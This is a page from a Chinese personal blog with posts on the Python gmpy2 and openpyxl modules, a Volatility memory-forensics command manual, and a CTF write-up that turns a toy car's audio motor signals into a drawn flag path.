<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>iHui</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="iHui">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="iHui">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="iHui">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">iHui</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-python的gmpy2模块" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/16/python%E7%9A%84gmpy2%E6%A8%A1%E5%9D%97/" class="article-date">
  <time class="dt-published" datetime="2019-12-16T10:32:12.000Z" itemprop="datePublished">2019-12-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/python/">python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/16/python%E7%9A%84gmpy2%E6%A8%A1%E5%9D%97/">python的gmpy2模块的使用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>以前都没有做过有关RSA的题目，今天饶有兴致，便开始安装gmpy2模块，但是困难真不是一般的大，自己花费了将近一下午的时间，才只是在kali的python2中安装了gmpy2模块，Windows真是有毒，以后有钱了一定要换台Mac<br>╭(╯^╰)╮╭(╯^╰)╮╭(╯^╰)╮</p>
<h1 id="2-安装gmpy2的教程"><a href="#2-安装gmpy2的教程" class="headerlink" title="2 安装gmpy2的教程"></a>2 安装gmpy2的教程</h1><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/37565f0ffdc8">https://www.jianshu.com/p/37565f0ffdc8</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/86555791">https://blog.csdn.net/qq1045553189/article/details/86555791</a></p>
<h1 id="3-简介"><a href="#3-简介" class="headerlink" title="3 简介"></a>3 简介</h1><p>gmpy2是一个C编码的Python扩展模块，它支持多精度算术。除了支持用于多精度整数和有理算术的GMP或MPIR，gmpy2还添加了对MPFR（正确舍入的实数浮点算术）和MPC（正确舍入的复数浮点算术）库的支持。</p>
<h1 id="4-示例"><a href="#4-示例" class="headerlink" title="4 示例"></a>4 示例</h1><h2 id="4-1-代码"><a href="#4-1-代码" class="headerlink" title="4.1 代码"></a>4.1 代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"># 求模幂</span><br><span class="line">print gmpy2.powmod(2, 3, 5)</span><br><span class="line">print gmpy2.powmod(2, 4, 5)</span><br><span class="line">print gmpy2.powmod(2, 5, 5)</span><br><span class="line">print</span><br><span class="line"></span><br><span class="line"># 求逆元（常用于RSA）</span><br><span class="line">p = 3</span><br><span class="line">q = 7</span><br><span class="line">e = 7</span><br><span class="line">n = p * q</span><br><span class="line">d = gmpy2.invert(e, (p - 1) * (q - 1))</span><br><span class="line">print d</span><br><span class="line">print</span><br><span class="line"></span><br><span class="line"># 判断素数</span><br><span class="line">print gmpy2.is_prime(3)</span><br><span class="line">print gmpy2.is_prime(6)</span><br><span class="line">print</span><br><span class="line"></span><br><span class="line"># 欧几里德算法，判断互素</span><br><span class="line">print gmpy2.gcd(2, 3)</span><br><span class="line">print gmpy2.gcd(4, 6)</span><br><span class="line">print</span><br><span class="line"></span><br><span class="line"># 扩展欧几里德算法</span><br><span class="line">print gmpy2.gcdext(2, 3)</span><br><span class="line">print gmpy2.gcdext(4, 6)</span><br><span class="line">print</span><br><span class="line"></span><br><span class="line"># 开n次方根</span><br><span class="line">print gmpy2.iroot(4, 2)</span><br><span class="line">print gmpy2.iroot(28, 3)</span><br></pre></td></tr></table></figure>

<h2 id="4-2-运行结果"><a href="#4-2-运行结果" class="headerlink" title="4.2 运行结果"></a>4.2 运行结果</h2><p><img src="https://img-blog.csdnimg.cn/20191216203600644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="gmpy2"></p>
<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p>通过这次使用gmpy2模块，我这周六的比赛更有信心了，这次比赛肯定能拿下几个flag<br>(#^.^#)(#^.^#)(#^.^#)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/12/16/python%E7%9A%84gmpy2%E6%A8%A1%E5%9D%97/" data-id="cl1qb1dyl004gqktucmlvawrb" data-title="python的gmpy2模块的使用" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-python的openpyxl模块" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/08/python%E7%9A%84openpyxl%E6%A8%A1%E5%9D%97/" class="article-date">
  <time class="dt-published" datetime="2019-12-08T07:17:42.000Z" itemprop="datePublished">2019-12-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/python/">python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/08/python%E7%9A%84openpyxl%E6%A8%A1%E5%9D%97/">python的openpyxl模块的使用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>今天舍友让我帮忙用python处理xlsx表格，但是自己还没意识到python还有这种强大的模块openpyxl，所以就拿来学习一下</p>
<h1 id="2-开源地址"><a href="#2-开源地址" class="headerlink" title="2 开源地址"></a>2 开源地址</h1><p><a target="_blank" rel="noopener" href="https://openpyxl.readthedocs.io/en/stable/">https://openpyxl.readthedocs.io/en/stable/</a></p>
<h1 id="3-简介"><a href="#3-简介" class="headerlink" title="3 简介"></a>3 简介</h1><p>openpyxl是一个Python库，用于读取&#x2F;写入Excel 2010 xlsx &#x2F; xlsm &#x2F; xltx &#x2F; xltm文件。</p>
<h1 id="4-具体使用"><a href="#4-具体使用" class="headerlink" title="4 具体使用"></a>4 具体使用</h1><h2 id="4-1-创建工作簿"><a href="#4-1-创建工作簿" class="headerlink" title="4.1 创建工作簿"></a>4.1 创建工作簿</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 创建工作簿</span><br><span class="line">from openpyxl import Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line"></span><br><span class="line"># 创建工作表，默认插在工作簿末尾</span><br><span class="line">ws = wb.create_sheet()</span><br><span class="line"></span><br><span class="line"># 工作表命令</span><br><span class="line">ws.title = &quot;ikun&quot;</span><br><span class="line"></span><br><span class="line"># 输出所有工作表</span><br><span class="line">print(wb.get_sheet_names())</span><br><span class="line"></span><br><span class="line"># 循环输出工作表</span><br><span class="line">for sheet in wb:</span><br><span class="line">    print(sheet.title)</span><br></pre></td></tr></table></figure>

<h2 id="4-2-操作数据"><a href="#4-2-操作数据" class="headerlink" title="4.2 操作数据"></a>4.2 操作数据</h2><p>为了实验效果，我事先找了以前的一个excel文档，里面有只有页Sheet1，其中数据内容如下</p>
<p><img src="https://img-blog.csdnimg.cn/20191208154631447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="示例表格"></p>
<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import load_workbook</span><br><span class="line"></span><br><span class="line"># 读入data.xlsx的内容，并将其输入到iris中</span><br><span class="line">fileHome = &quot;d:/tmp/data.xlsx&quot;</span><br><span class="line">wb = load_workbook(filename = fileHome)</span><br><span class="line">ws = wb[&quot;Sheet1&quot;]</span><br><span class="line"></span><br><span class="line"># 打印sheet页</span><br><span class="line">print(wb.sheetnames)</span><br><span class="line"></span><br><span class="line"># 打印第C列</span><br><span class="line">print(ws[&quot;C&quot;])</span><br><span class="line"></span><br><span class="line"># 打印第4行</span><br><span class="line">print(ws[&quot;4&quot;])</span><br><span class="line"></span><br><span class="line"># 打印第C4格的值</span><br><span class="line">print(ws[&quot;C4&quot;].value)</span><br><span class="line"></span><br><span class="line"># 打印最大行数</span><br><span class="line">print(ws.max_row)</span><br><span class="line"></span><br><span class="line"># 打印最大列数</span><br><span class="line">print(ws.max_column)</span><br><span class="line"></span><br><span class="line"># 打印A列中的所有值</span><br><span class="line">for i in ws[&quot;A&quot;]:</span><br><span class="line">    print(i.value, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"># 打印D列中的所有值</span><br><span class="line">for i in range(100):</span><br><span class="line">    print(ws.cell(row = i + 1, column = 4).value, end =&quot; &quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191208160718161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="读取数据代码示例"></p>
<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = &quot;ikun&quot;</span><br><span class="line">ws[&#x27;C3&#x27;] = &#x27;Hello world!!!&#x27;</span><br><span class="line">for i in range(10):</span><br><span class="line">  ws[&quot;A%d&quot; % (i+1)].value = i + 1</span><br><span class="line">ws[&quot;E1&quot;].value = &quot;=SUM(A:A)&quot;</span><br><span class="line">wb.save(&#x27;d:/tmp/demo.xlsx&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191208160613404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="修改数据代码示例"></p>
<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p>通过这次使用openpyxl模块，我又一次被python震撼了，从此以后为了自己的头发，还是多用python吧<br>(#^.^#)(#^.^#)(#^.^#)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/12/08/python%E7%9A%84openpyxl%E6%A8%A1%E5%9D%97/" data-id="cl1qb1dyo004oqktu7vo42irp" data-title="python的openpyxl模块的使用" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Volatility使用手册" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/12/Volatility%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" class="article-date">
  <time class="dt-published" datetime="2019-11-12T11:40:43.000Z" itemprop="datePublished">2019-11-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/12/Volatility%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">Volatility使用手册</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h1><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p>
<h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h1><h2 id="2-1-镜像基本信息"><a href="#2-1-镜像基本信息" class="headerlink" title="2.1 镜像基本信息"></a>2.1 镜像基本信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility imageinfo -f Advertising\ for\ Marriage.raw</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112184416809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="镜像信息"></p>
<p>关键看Suggested Profile(s)项，这里是工具判断该镜像的架构，同时也会提供相应架构的命令用于分析该镜像,然后在调用命令时加上如下命令 ‐‐profile&#x3D;WinXPSP2x86 就可以了</p>
<h2 id="2-2-查看进程信息"><a href="#2-2-查看进程信息" class="headerlink" title="2.2 查看进程信息"></a>2.2 查看进程信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility pslist -f Advertising\ for\ Marriage.raw ‐‐profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112185110796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="查看进程"></p>
<h2 id="2-3-扫描文件"><a href="#2-3-扫描文件" class="headerlink" title="2.3 扫描文件"></a>2.3 扫描文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility filescan -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>

<h2 id="2-4-导出图片"><a href="#2-4-导出图片" class="headerlink" title="2.4 导出图片"></a>2.4 导出图片</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility dumpfiles -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 -Q 0x000000000249ae78 -D ./</span><br></pre></td></tr></table></figure>

<h2 id="2-5-常用的命令"><a href="#2-5-常用的命令" class="headerlink" title="2.5 常用的命令"></a>2.5 常用的命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>cmdline&#x2F;cmdscan</td>
<td>列出历史cmd命令</td>
</tr>
<tr>
<td>filescan</td>
<td>扫描文件，可配合grep使用</td>
</tr>
<tr>
<td>netscan</td>
<td>扫描建立的连接和套接字，类似于netstat</td>
</tr>
<tr>
<td>pslist&#x2F;psscan</td>
<td>列出进程列表</td>
</tr>
<tr>
<td>svcscan</td>
<td>扫描windows服务列表</td>
</tr>
<tr>
<td>screenshot</td>
<td>显示GDI样式的截屏</td>
</tr>
<tr>
<td>memdump</td>
<td>从内存dump进程的内存</td>
</tr>
<tr>
<td>dumpfiles</td>
<td>从内存dump文件</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/12/Volatility%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" data-id="cl1qb1dyf0040qktu6km9dpjt" data-title="Volatility使用手册" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-第三届红帽杯网络安全攻防大赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/12/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2019-11-12T08:07:43.000Z" itemprop="datePublished">2019-11-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/12/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B/">第三届红帽杯网络安全攻防大赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>进去之后填个调查问卷，完成调查问卷后即可在新打开的页面中获得flag</p>
<h2 id="玩具车"><a href="#玩具车" class="headerlink" title="玩具车"></a>玩具车</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开题目并解压后发现以下文件，大致就是提供了小车的原理图，L298n 的简易电路图，还有一堆音频文件</p>
<p><img src="https://img-blog.csdnimg.cn/20191112161256142.png" alt="玩具车文件"></p>
<p>使用 Audacity 查看音频文件的波形，发现以下规律</p>
<ul>
<li>波形相同组一：L293_1_A1 ; L293_1_A2 ; L293_2_A1 ; L293_2_A2</li>
<li>波形相同组二：L293_1_B1 ; L293_1_B2 ; L293_2_B1 ; L293_2_B2</li>
<li>波形相同组三：L293_1_EnA ; L293_1_EnB ; L293_2_EnA ; L293_2_EnB</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20191112152755528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="A音频波形分析"></p>
<p><img src="https://img-blog.csdnimg.cn/20191112152850306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="B音频波形分析"></p>
<p><img src="https://img-blog.csdnimg.cn/20191112153012582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="En音频波形分析"></p>
<p>按照以前在电工课上的经验，En 是使能端，需要高电平才会给电机输出驱动。 A 和 B 可以控制电机转动方向，进而控制小车直线运动与转向，大致规律如下。</p>
<ul>
<li>A(高电平) + B(高电平) &#x3D; 前进</li>
<li>A(低电平) + B(低电平) &#x3D; 后退</li>
<li>A(低电平) + B(高电平) &#x3D; 原地右转</li>
<li>A(高电平) + B(低电平) &#x3D; 原地左转</li>
</ul>
<p>接下来就是 wave 和 PIL 相结合，把运动轨迹画出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">import wave</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image, ImageDraw</span><br><span class="line"></span><br><span class="line">wav_A = wave.open(&quot;D:/CTF Practice/L293_1_A1.wav&quot;, &#x27;r&#x27;)</span><br><span class="line">wav_B = wave.open(&quot;D:/CTF Practice/L293_1_B1.wav&quot;, &#x27;r&#x27;)</span><br><span class="line">wav_En = wave.open(&quot;D:/CTF Practice/L293_1_EnA.wav&quot;, &#x27;r&#x27;)</span><br><span class="line"></span><br><span class="line">def read_wav(wav):</span><br><span class="line">    num_frame = wav.getnframes()</span><br><span class="line">    num_channel = wav.getnchannels()</span><br><span class="line">    framerate = wav.getframerate()</span><br><span class="line">    str_data = wav.readframes(num_frame)</span><br><span class="line">    wave_data = np.fromstring(str_data, dtype = np.short)</span><br><span class="line">    wave_data.shape = -1, num_channel</span><br><span class="line">    return wave_data, framerate</span><br><span class="line"></span><br><span class="line">def convert_level(level):</span><br><span class="line">    if level != 0: return 1</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line">def draw(wav_A, wav_B, wav_En):</span><br><span class="line">    wave_data_A, framerate_A = read_wav(wav_A)</span><br><span class="line">    wave_data_B, framerate_B = read_wav(wav_B)</span><br><span class="line">    wave_data_En, framerate_En = read_wav(wav_En)</span><br><span class="line"></span><br><span class="line">    width = 4000</span><br><span class="line">    height = 500</span><br><span class="line">    im = Image.new(&#x27;RGB&#x27;,(width,height),&#x27;white&#x27;)</span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line">    pos = [300, 300]</span><br><span class="line">    direction = 1</span><br><span class="line">    walk = 0</span><br><span class="line"></span><br><span class="line">    cnt = 0</span><br><span class="line">    rotate_cnt = 0</span><br><span class="line">    for i in range(len(wave_data_A)):</span><br><span class="line">        cnt += 1</span><br><span class="line">        if cnt % 200 != 0: continue</span><br><span class="line">        level_A = convert_level(wave_data_A[i][0])</span><br><span class="line">        level_B = convert_level(wave_data_B[i][0])</span><br><span class="line">        level_En = convert_level(wave_data_En[i][0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if level_En == 1:</span><br><span class="line">            if level_A == 0 and level_B == 0:</span><br><span class="line">                rotate_cnt = 0</span><br><span class="line">                walk = 1</span><br><span class="line">                draw.point((pos[0],pos[1]),&#x27;black&#x27;)</span><br><span class="line">                if direction == 0:</span><br><span class="line">                    pos[0] -= 1</span><br><span class="line">                if direction == 2:</span><br><span class="line">                    pos[0] += 1</span><br><span class="line">                if direction == 1:</span><br><span class="line">                    pos[1] += 1</span><br><span class="line">                if direction == 3:</span><br><span class="line">                    pos[1] -= 1</span><br><span class="line">            if level_A == 1 and level_B == 1:</span><br><span class="line">                rotate_cnt = 0</span><br><span class="line">                walk = 1</span><br><span class="line">                draw.point((pos[0],pos[1]),&#x27;black&#x27;)</span><br><span class="line">                if direction == 0:</span><br><span class="line">                    pos[0] += 1</span><br><span class="line">                if direction == 2:</span><br><span class="line">                    pos[0] -= 1</span><br><span class="line">                if direction == 1:</span><br><span class="line">                    pos[1] -= 1</span><br><span class="line">                if direction == 3:</span><br><span class="line">                    pos[1] += 1</span><br><span class="line">            if level_A == 0 and level_B == 1:</span><br><span class="line">                walk = 0</span><br><span class="line">                rotate_cnt += 1</span><br><span class="line">                if rotate_cnt % 40 == 0:</span><br><span class="line">                    direction += 1</span><br><span class="line">                    direction = direction % 4</span><br><span class="line">            if level_A == 1 and level_B == 0:</span><br><span class="line">                walk = 0</span><br><span class="line">                rotate_cnt += 1</span><br><span class="line">                if rotate_cnt % 40 == 0:</span><br><span class="line">                    direction -= 1</span><br><span class="line">                    if direction &lt; 0: direction = 3</span><br><span class="line"></span><br><span class="line">    im.show()</span><br><span class="line"></span><br><span class="line">draw(wav_A, wav_B, wav_En)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112160610755.png" alt="利用脚本获得flag轨迹"></p>
